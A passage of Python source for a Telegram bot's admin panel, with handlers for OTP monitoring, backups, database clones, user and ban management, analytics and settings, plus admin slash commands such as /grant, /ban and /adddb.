    kb = InlineKeyboardMarkup([
        [_ikb("🔴 Turn Off" if is_on else "🟢 Turn On",
              callback_data="monitor:toggle",
              style="danger" if is_on else "success")],
        [_ikb("✏️ Edit OTP Format", callback_data="monitor:edit_fmt", style="primary")],
        [_ikb("📡 Set Forward Channel", callback_data="monitor:set_fwd", style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _txt_backup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    history  = await get_backup_history(5)
    auto_on  = await gsbool("auto_db_enabled", False)
    interval = await gsint("auto_db_interval", 3600)
    target   = await get_setting("auto_db_group", "")
    extras   = await gsjson("multi_backup_targets", [])
    lines = [f"📦 {fmt_dt(h['timestamp'])} · {fmt_size(h.get('size_bytes') or 0)}"
             for h in history]
    text = ui_screen("💾","Backup Manager",
        ui_box(
            ui_status("Auto Backup", auto_on),
            ui_kv("⏱","Interval",    f"{interval//3600}h {(interval%3600)//60}m"),
            ui_kv("📤","Primary",     target or "Not set"),
            ui_kv("📋","Extra Targets", str(len(extras))),
        ),
        ui_box("\n".join(lines) if lines else "📭 No backups yet."),
        subtitle="Compressed gzip backups",
    )
    kb = InlineKeyboardMarkup([
        [_ikb("📤 Backup Now",        callback_data="backup:now",        style="success"),
         _ikb("📋 History",           callback_data="backup:history",    style="primary")],
        [_ikb("🔴 Disable Auto" if auto_on else "🟢 Enable Auto",
              callback_data="backup:toggle_auto",
              style="danger" if auto_on else "success"),
         _ikb("🎯 Set Target",        callback_data="backup:set_target", style="primary")],
        [_ikb("➕ Add Extra Target",  callback_data="backup:add_target", style="primary"),
         _ikb("📋 Extra Targets",     callback_data="backup:extra_list", style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _txt_clone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    clones = await get_clones()
    lines  = [f"🧬 <b>{he(c['name'])}</b> ← {he(c.get('source_name') or '?')}"
              for c in clones[:8]]
    text = ui_screen("🧬","Clone Manager",
        ui_box(ui_kv("📦","Total Clones",str(len(clones)))),
        ui_box("\n".join(lines) if lines else "📭 No clones yet."),
    )
    kb = InlineKeyboardMarkup([
        [_ikb("➕ Clone a DB",   callback_data="clone:start",  style="success"),
         _ikb("📋 All Clones",   callback_data="clone:list:0", style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _txt_customize(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    wc    = await get_welcome()
    brand = await get_setting("bot_brand_name", BOT_BRAND_NAME)
    text = ui_screen("🎨","Customize Studio",
        ui_box(
            ui_kv("🏷","Brand Name",      he(brand)),
            ui_status("Welcome Text (A)",  bool(wc.get("text"))),
            ui_status("Welcome Media (A)", bool(wc.get("media_file_id"))),
            ui_status("Welcome Text (B)",  bool(wc.get("text_b"))),
            ui_status("Welcome Media (B)", bool(wc.get("media_file_id_b"))),
        ),
        subtitle="A/B welcome variants · Media support",
    )
    kb = InlineKeyboardMarkup([
        [_ikb("✏️ Welcome Text A",   callback_data="cust:text_a",    style="primary"),
         _ikb("✏️ Welcome Text B",   callback_data="cust:text_b",    style="primary")],
        [_ikb("🖼 Media A",          callback_data="cust:media_a",   style="primary"),
         _ikb("🖼 Media B",          callback_data="cust:media_b",   style="primary")],
        [_ikb("🗑 Clear Media A",    callback_data="cust:clr_a",     style="danger"),
         _ikb("🗑 Clear Media B",    callback_data="cust:clr_b",     style="danger")],
        [_ikb("👁 Preview Welcome",  callback_data="cust:preview",   style="success")],
        [_ikb("🏷 Change Brand",     callback_data="cust:brand",     style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _txt_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    async with db() as c:
        total = c.execute("SELECT COUNT(*) FROM all_users").fetchone()[0]
    text = ui_screen("👥","User Manager",
        ui_box(
            ui_kv("👥","Total Users", str(total)),
            ui_kv("🔑","Allowed",     str(len(allowed_users))),
            ui_kv("👑","Admins",      str(len(ADMIN_IDS))),
        ),
    )
    kb = InlineKeyboardMarkup([
        [_ikb("✅ Grant Access",  callback_data="user:grant",     style="success"),
         _ikb("🚫 Revoke Access", callback_data="user:revoke",    style="danger")],
        [_ikb("👑 Add Admin",     callback_data="user:add_admin", style="primary"),
         _ikb("📋 Allowed List",  callback_data="user:list:0",   style="primary")],
        [_ikb("📡 Broadcast",     callback_data="user:broadcast", style="primary"),
         _ikb("🔍 Find User",     callback_data="user:search",   style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _txt_ban_manager(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    text = ui_screen("🚫","Ban Manager",
        ui_box(ui_kv("🚫","Total Banned",str(len(banned_users)))),
        subtitle="Temp and permanent ban system",
    )
    kb = InlineKeyboardMarkup([
        [_ikb("🚫 Ban User",     callback_data="ban:add",    style="danger"),
         _ikb("✅ Unban User",   callback_data="ban:remove", style="success")],
        [_ikb("📋 Banned List",  callback_data="ban:list:0", style="primary")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _txt_analytics(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    data = await get_analytics_summary()
    week_lines = [f"📅 {r['day']}: <b>{r['cnt']}</b> OTPs" for r in data.get("week",[])]
    top_db    = data.get("top_db", {})
    peak_hour = data.get("peak_hour", {})
    text = ui_screen("📊","Analytics Dashboard",
        ui_box(
            ui_kv("📱","Today OTPs",    str(data["total_today"])),
            ui_kv("📊","All Time",      str(data["total_all"])),
            ui_kv("🏆","Top DB Today",  he(top_db.get("db_name","—"))),
            ui_kv("⏰","Peak Hour",     f"{peak_hour.get('hour','—')}:00"),
        ),
        ui_box("\n".join(week_lines) if week_lines else "📭 No data yet."),
        subtitle="Last 7 days",
        footer=f"🕐 {datetime.now().strftime('%d %b %Y %H:%M')}",
    )
    kb = InlineKeyboardMarkup([
        [_ikb("📤 Export OTP CSV", callback_data="ana:export", style="success")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _txt_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    grant_req  = await gsbool("grant_access_required", True)
    ref_en     = await gsbool("referral_enabled", True)
    ref_req    = await gsint("required_referrals", 2)
    poll_int   = await gsint("poll_interval", POLL_INTERVAL)
    auto_bk    = await gsbool("auto_db_enabled", False)
    maint      = await gsbool("maintenance_mode", False)
    wl_mode    = await gsbool("whitelist_mode", False)
    rate_lim   = await gsint("otp_rate_limit", OTP_RATE_LIMIT)
    stale_mins = await gsint("otp_stale_mins", OTP_STALE_MINS)
    text = ui_screen("⚙️","Settings",
        ui_box(
            ui_status("Access Control",   grant_req),
            ui_status("Referral System",  ref_en),
            ui_kv("👥","Refs Required",   str(ref_req)),
            ui_kv("⏱","Poll Interval",   f"{poll_int}s"),
            ui_status("Auto Backup",      auto_bk),
            ui_status("Maintenance Mode", maint),
            ui_status("Whitelist Mode",   wl_mode),
            ui_kv("🚦","Rate Limit",      f"{rate_lim}/min"),
            ui_kv("⏰","Stale OTP",       f"{stale_mins}min"),
        ),
    )
    kb = InlineKeyboardMarkup([
        [_ikb("🔴 Disable Access" if grant_req else "🟢 Enable Access",
              callback_data="settings:toggle_grant",
              style="danger" if grant_req else "success"),
         _ikb("🔴 Disable Refs" if ref_en else "🟢 Enable Refs",
              callback_data="settings:toggle_referral",
              style="danger" if ref_en else "success")],
        [_ikb("⏱ Poll Interval",    callback_data="settings:poll",        style="primary"),
         _ikb("🔢 Refs Required",   callback_data="settings:refs",        style="primary")],
        [_ikb("🔴 Maint OFF" if maint else "🟡 Maint ON",
              callback_data="settings:toggle_maint",
              style="danger" if maint else "primary"),
         _ikb("🚦 Rate Limit",      callback_data="settings:rate",        style="primary")],
        [_ikb("⏰ Stale Threshold", callback_data="settings:stale",       style="primary"),
         _ikb("🔴 WL OFF" if wl_mode else "🟢 WL ON",
              callback_data="settings:toggle_wl",
              style="danger" if wl_mode else "success")],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def _txt_activity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    async with db() as c:
        rows = c.execute(
            "SELECT user_id,action,detail,timestamp FROM activity_log "
            "ORDER BY timestamp DESC LIMIT 15"
        ).fetchall()
    lines = [f"👤 <code>{r['user_id']}</code> · {he(r['action'])} · "
             f"{r['timestamp'][:16].replace('T',' ')}" for r in rows]
    text = ui_screen("📋","Activity Log",
        ui_box("\n".join(lines) if lines else "📭 No activity yet."),
        subtitle="Last 15 actions",
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def _go_home(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    admin = is_admin(update.effective_user.id)
    await update.message.reply_text("🏠 Main Menu", reply_markup=main_menu_kb(admin))


# ══════════════════════════════════════════════════════════════════
#  SLASH COMMANDS
# ══════════════════════════════════════════════════════════════════

async def cmd_grant(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    if not context.args:
        await update.message.reply_text("Usage: /grant USER_ID"); return
    try:
        uid = int(context.args[0])
        await grant_access(uid, update.effective_user.id)
        await update.message.reply_text(f"✅ Granted: <code>{uid}</code>", parse_mode=ParseMode.HTML)
    except ValueError: await update.message.reply_text("❌ Invalid user ID")

async def cmd_revoke(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    if not context.args:
        await update.message.reply_text("Usage: /revoke USER_ID"); return
    try:
        uid = int(context.args[0])
        await revoke_access(uid)
        await update.message.reply_text(f"🚫 Revoked: <code>{uid}</code>", parse_mode=ParseMode.HTML)
    except ValueError: await update.message.reply_text("❌ Invalid user ID")

async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /ban USER_ID [hours] [reason]"); return
    try:
        uid    = int(args[0])
        hours  = int(args[1]) if len(args) > 1 and args[1].isdigit() else 0
        reason = " ".join(args[2:]) if len(args) > 2 else "Admin ban"
        await ban_user(uid, update.effective_user.id, reason, hours)
        await update.message.reply_text(
            f"🚫 Banned: <code>{uid}</code>\n⏱ {f'{hours}h' if hours else 'Permanent'}\n❌ {he(reason)}",
            parse_mode=ParseMode.HTML)
    except (ValueError, IndexError): await update.message.reply_text("❌ Invalid args")

async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    if not context.args:
        await update.message.reply_text("Usage: /unban USER_ID"); return
    try:
        uid = int(context.args[0])
        await unban_user(uid)
        await update.message.reply_text(f"✅ Unbanned: <code>{uid}</code>", parse_mode=ParseMode.HTML)
    except ValueError: await update.message.reply_text("❌ Invalid user ID")

async def cmd_adddb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    if not context.args or len(context.args) < 2:
        await update.message.reply_text("Usage: /adddb DB_NAME https://url"); return
    name, url = context.args[0], context.args[1]
    DATABASES[name] = url
    await update.message.reply_text(f"✅ Added: <code>{he(name)}</code>", parse_mode=ParseMode.HTML)

async def cmd_removedb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    if not context.args:
        await update.message.reply_text("Usage: /removedb DB_NAME"); return
    name = " ".join(context.args)
    if name in DATABASES:
        DATABASES.pop(name)
        await update.message.reply_text(f"🗑 Removed: <code>{he(name)}</code>", parse_mode=ParseMode.HTML)
    else: await update.message.reply_text("❌ DB not found")

async def cmd_backup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    await update.message.reply_text("⏳ Preparing backup...")
    ok = await send_backup(context.bot, update.effective_user.id)
    if not ok: await update.message.reply_text("❌ Backup failed")

async def cmd_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    state = await toggle_monitor(update.effective_user.id)
    await update.message.reply_text(
        f"📡 <b>Live Monitor: {'🟢 ON' if state else '🔴 OFF'}</b>", parse_mode=ParseMode.HTML)

async def cmd_health(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    await update.message.reply_text("⏳ Checking...")
    session = await get_session()
    results = await run_health_check(session)
    alive = sum(1 for s in results.values() if s=="alive")
    dead  = sum(1 for s in results.values() if s=="dead")
    await update.message.reply_text(
        f"✅ Done:\n🟢 Alive: <b>{alive}</b>\n🔴 Dead: <b>{dead}</b>",
        parse_mode=ParseMode.HTML)

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id): return
    await _txt_analytics(update, context)

async def cmd_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != OWNER_ID: return
    if not context.args:
        await update.message.reply_text("Usage: /addadmin USER_ID"); return
    try:
        uid = int(context.args[0])
        ADMIN_IDS.add(uid)
        async with db() as c:
            c.execute("INSERT OR IGNORE INTO admins(user_id,added_by,added_at) VALUES(?,?,?)",
                      (uid, OWNER_ID, datetime.utcnow().isoformat()))
        await update.message.reply_text(f"👑 Admin added: <code>{uid}</code>", parse_mode=ParseMode.HTML)
    except ValueError: await update.message.reply_text("❌ Invalid user ID")

# ═══ PART 2 ENDS HERE ═══
